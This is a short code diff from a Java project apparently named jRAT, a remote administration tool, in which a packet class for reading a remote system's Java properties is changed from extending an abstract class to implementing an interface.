@@ -6,7 +6,7 @@ import jrat.client.packets.outgoing.Packet44SystemJavaProperty;
 import java.util.Set;
 
 
-public class Packet61SystemJavaProperties extends AbstractIncomingPacket {
+public class Packet61SystemJavaProperties implements IncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
